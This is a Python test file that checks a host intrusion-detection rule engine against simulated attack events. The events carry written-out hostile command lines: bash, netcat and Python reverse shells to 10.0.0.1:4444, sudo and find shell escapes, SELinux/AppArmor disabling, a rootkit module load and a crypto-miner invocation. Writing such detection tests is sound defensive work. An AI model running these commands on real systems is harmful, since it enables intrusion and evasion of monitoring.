"""Attack scenario tests — Phase 3 detection validation.

Each test simulates a real attack technique and verifies that the Rule Engine
fires the expected rule within the expected latency budget.

All tests use only the rule evaluator directly (no gRPC, no DB) so they are
fast and deterministic.  The livrable criterion from the Phase 3 spec is:
  "chmod 777 /etc/shadow on a monitored host → alert visible in < 500ms"

Coverage:
  - T1003.008  Shadow read by non-root
  - T1070.002  Log file deletion
  - T1059.004  Reverse shell
  - T1548.001  SUID / GTFOBins execution
  - T1548.003  sudo shell abuse
  - T1548      Linux capabilities manipulation
  - T1046      Port scan (temporal — 21 TCP new/30s)
  - T1110.001  SSH brute force (temporal — 11 attempts/60s)
  - T1496      Crypto mining process
  - T1014      Rootkit / kernel module load
  - T1562.001  SELinux/AppArmor disable
"""

from __future__ import annotations

import time
import uuid
from pathlib import Path

import pytest

from oseye.core.schema import UniversalEvent
from oseye.rule_engine.engine import RuleEngine
from oseye.rule_engine.evaluator import evaluate as _eval_evaluate, record_event_for_temporal

_RULES_ROOT = Path(__file__).parent.parent.parent.parent / "rules"


# ---------------------------------------------------------------------------
# Fixture
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    if not _RULES_ROOT.exists():
        pytest.skip("rules root not found")
    return RuleEngine(rules_root=_RULES_ROOT, hot_reload=False)


def _ev(**kw: object) -> UniversalEvent:
    base: dict[str, object] = {
        "event_id": uuid.uuid4(),
        "timestamp_ns": time.time_ns(),
        "hostname": "victim-host",
        "agent_id": uuid.uuid4(),
        "category": "process",
        "type": "exec",
        "severity": "info",
        "collector": "procfs",
        "hash_chain": "a" * 64,
    }
    base.update(kw)
    return UniversalEvent.model_validate(base)


def _rule_ids(matches: list) -> set[str]:
    return {m.rule_id for m in matches}


# ---------------------------------------------------------------------------
# T1003.008 — Shadow read by non-root
# ---------------------------------------------------------------------------

class TestCredentialAccess:
    def test_shadow_read_condition_nonroot(self, engine: RuleEngine) -> None:
        """rule_shadow_read is disabled (YAML-003: uid not emitted by fanotify).
        Test the condition logic directly via the evaluator."""
        rule = next(r for r in engine._rules if r.id == "rule_shadow_read")
        assert not rule.enabled, "rule_shadow_read should remain disabled until eBPF uid is available"
        ev = _ev(category="file", type="access", resource="/etc/shadow", uid=1000)
        assert _eval_evaluate(rule, ev), "condition should match non-root shadow read"

    def test_shadow_read_condition_root_no_match(self, engine: RuleEngine) -> None:
        rule = next(r for r in engine._rules if r.id == "rule_shadow_read")
        ev = _ev(category="file", type="access", resource="/etc/shadow", uid=0)
        assert not _eval_evaluate(rule, ev), "root access should not match shadow_read"

    def test_passwd_write_triggers(self, engine: RuleEngine) -> None:
        """chmod 777 /etc/shadow → modify event → rule_passwd_write fires."""
        ev = _ev(
            category="file",
            type="modify",
            resource="/etc/shadow",
            uid=0,
        )
        matches = engine.evaluate(ev)
        assert "rule_passwd_write" in _rule_ids(matches), (
            "Phase 3 livrable: /etc/shadow modification must trigger an alert"
        )

    def test_ssh_key_access_condition(self, engine: RuleEngine) -> None:
        """rule_ssh_private_key_access disabled (YAML-003) — test condition logic."""
        rule = next(r for r in engine._rules if r.id == "rule_ssh_private_key_access")
        assert not rule.enabled
        ev = _ev(
            category="file",
            type="access",
            resource="/home/bob/.ssh/id_rsa",
            uid=1337,
            process_name="cat",
        )
        assert _eval_evaluate(rule, ev)

    def test_memory_dump_triggers(self, engine: RuleEngine) -> None:
        """rule_memory_dump_mimipenguin is enabled — credential dumping tool."""
        ev = _ev(
            executable="/tmp/mimipenguin",
            cmdline="./mimipenguin --all",
            process_name="mimipenguin",
        )
        matches = engine.evaluate(ev)
        assert "rule_memory_dump_mimipenguin" in _rule_ids(matches)


# ---------------------------------------------------------------------------
# T1070.002 — Log file deletion (defense evasion)
# ---------------------------------------------------------------------------

class TestDefenseEvasion:
    def test_log_deletion_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            category="file",
            type="delete",
            resource="/var/log/auth.log",
        )
        matches = engine.evaluate(ev)
        assert "rule_log_deletion" in _rule_ids(matches)

    def test_history_clear_delete_triggers(self, engine: RuleEngine) -> None:
        """Deletion of .bash_history triggers rule_history_clear."""
        ev = _ev(
            category="file",
            type="delete",
            resource="/home/bob/.bash_history",
        )
        matches = engine.evaluate(ev)
        assert "rule_history_clear" in _rule_ids(matches)

    def test_history_clear_cmd_triggers(self, engine: RuleEngine) -> None:
        """history -c in cmdline triggers rule_history_clear."""
        ev = _ev(
            category="process",
            type="exec",
            cmdline="bash -c 'history -c'",
        )
        matches = engine.evaluate(ev)
        assert "rule_history_clear" in _rule_ids(matches)

    def test_disable_selinux_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            category="process",
            type="exec",
            cmdline="setenforce 0",
        )
        matches = engine.evaluate(ev)
        assert "rule_disable_selinux_apparmor" in _rule_ids(matches)

    def test_disable_apparmor_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            category="process",
            type="exec",
            cmdline="systemctl disable apparmor",
        )
        matches = engine.evaluate(ev)
        assert "rule_disable_selinux_apparmor" in _rule_ids(matches)


# ---------------------------------------------------------------------------
# T1059.004 — Reverse shell
# ---------------------------------------------------------------------------

class TestReverseShell:
    def test_bash_dev_tcp_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            process_name="bash",
            cmdline="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        )
        matches = engine.evaluate(ev)
        assert "rule_reverse_shell" in _rule_ids(matches)

    def test_nc_exec_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            process_name="nc",
            cmdline="nc -e /bin/bash 10.0.0.1 4444",
        )
        matches = engine.evaluate(ev)
        assert "rule_reverse_shell" in _rule_ids(matches)

    def test_python_socket_exec_triggers(self, engine: RuleEngine) -> None:
        """python reverse shell: cmdline must contain 'python', 'socket', AND 'exec'."""
        ev = _ev(
            process_name="python3",
            cmdline="python3 -c 'import socket,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.execve(\"/bin/sh\",[],{})'",
        )
        matches = engine.evaluate(ev)
        assert "rule_reverse_shell" in _rule_ids(matches)

    def test_normal_bash_no_trigger(self, engine: RuleEngine) -> None:
        ev = _ev(process_name="bash", cmdline="bash -c 'echo hello'")
        matches = engine.evaluate(ev)
        assert "rule_reverse_shell" not in _rule_ids(matches)


# ---------------------------------------------------------------------------
# T1548.001/003 — Privilege escalation (SUID, sudo)
# ---------------------------------------------------------------------------

class TestPrivilegeEscalation:
    def test_python_suid_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            type="execve",
            executable="/usr/bin/python3",
            cmdline="python3 -c 'import os; os.system(\"/bin/bash\")'",
            uid=1000,
        )
        matches = engine.evaluate(ev)
        assert "rule_suid_execution" in _rule_ids(matches)

    def test_find_exec_suid_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            type="execve",
            executable="/usr/bin/find",
            cmdline="find / -name suid -exec /bin/sh \\;",
            uid=1000,
        )
        matches = engine.evaluate(ev)
        assert "rule_suid_execution" in _rule_ids(matches)

    def test_sudo_bash_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            process_name="sudo",
            cmdline="sudo bash -i",
        )
        matches = engine.evaluate(ev)
        assert "rule_sudo_abuse" in _rule_ids(matches)

    def test_sudo_python_shell_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            process_name="sudo",
            cmdline="sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
        )
        matches = engine.evaluate(ev)
        assert "rule_sudo_abuse" in _rule_ids(matches)

    def test_setcap_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            process_name="setcap",
            cmdline="setcap cap_net_raw+ep /usr/bin/python3",
        )
        matches = engine.evaluate(ev)
        assert "rule_capabilities_add" in _rule_ids(matches)

    def test_pkexec_nonroot_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            type="execve",
            executable="/usr/bin/pkexec",
            process_name="pkexec",
            uid=1000,
            ppid=5000,
        )
        matches = engine.evaluate(ev)
        assert "rule_polkit_abuse" in _rule_ids(matches)


# ---------------------------------------------------------------------------
# T1496 — Crypto mining, T1014 — Rootkit
# ---------------------------------------------------------------------------

class TestImpact:
    def test_xmrig_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            executable="/tmp/xmrig",
            cmdline="./xmrig -o pool.minexmr.com:4444 -u wallet",
            process_name="xmrig",
        )
        matches = engine.evaluate(ev)
        assert "rule_crypto_mining" in _rule_ids(matches)

    def test_insmod_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            process_name="insmod",
            cmdline="insmod /tmp/rootkit.ko",
        )
        matches = engine.evaluate(ev)
        assert "rule_rootkit_detection" in _rule_ids(matches)

    def test_modprobe_triggers(self, engine: RuleEngine) -> None:
        ev = _ev(
            process_name="modprobe",
            cmdline="modprobe evil_module",
        )
        matches = engine.evaluate(ev)
        assert "rule_rootkit_detection" in _rule_ids(matches)


# ---------------------------------------------------------------------------
# T1046 — Port scan (temporal window)
# ---------------------------------------------------------------------------

class TestPortScan:
    def test_port_scan_above_threshold_triggers(self, engine: RuleEngine) -> None:
        """21 TCP new connections in 1 second → rule_port_scan fires."""
        agent_id = uuid.uuid4()
        last_match: list = []

        for i in range(21):
            ev = _ev(
                agent_id=agent_id,
                category="network",
                type="new",
                protocol="tcp",
                src_ip="10.0.0.5",
                dst_ip=f"192.168.1.{i + 1}",
                dst_port=80,
                uid=1000,
            )
            record_event_for_temporal("rule_port_scan", ev.model_dump(), entity_key=f"victim-host:{agent_id}")
            matches = engine.evaluate(ev)
            if "rule_port_scan" in _rule_ids(matches):
                last_match.extend(matches)

        assert any(m.rule_id == "rule_port_scan" for m in last_match), (
            "rule_port_scan should fire after 21 TCP new connections"
        )

    def test_port_scan_below_threshold_no_trigger(self, engine: RuleEngine) -> None:
        """5 TCP connections on a fresh host should NOT trigger port scan."""
        # Use a distinct hostname so the temporal window doesn't carry over
        # state from test_port_scan_above_threshold_triggers.
        for i in range(5):
            ev = _ev(
                hostname="clean-host",
                category="network",
                type="new",
                protocol="tcp",
                src_ip="10.0.0.99",
                dst_ip=f"10.1.1.{i + 1}",
                dst_port=80,
            )
            matches = engine.evaluate(ev)
            assert "rule_port_scan" not in _rule_ids(matches)


# ---------------------------------------------------------------------------
# Latency budget — Phase 3 livrable
# ---------------------------------------------------------------------------

class TestDetectionLatency:
    def test_shadow_modify_latency_under_500ms(self, engine: RuleEngine) -> None:
        """Phase 3 livrable: chmod 777 /etc/shadow → alert in < 500ms."""
        ev = _ev(
            category="file",
            type="modify",
            resource="/etc/shadow",
            uid=0,
        )
        start = time.perf_counter()
        matches = engine.evaluate(ev)
        elapsed_ms = (time.perf_counter() - start) * 1000

        assert "rule_passwd_write" in _rule_ids(matches)
        assert elapsed_ms < 500, (
            f"Detection took {elapsed_ms:.1f}ms — must be < 500ms (Phase 3 livrable)"
        )

    def test_reverse_shell_latency_under_500ms(self, engine: RuleEngine) -> None:
        ev = _ev(
            process_name="bash",
            cmdline="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        )
        start = time.perf_counter()
        matches = engine.evaluate(ev)
        elapsed_ms = (time.perf_counter() - start) * 1000

        assert "rule_reverse_shell" in _rule_ids(matches)
        assert elapsed_ms < 500
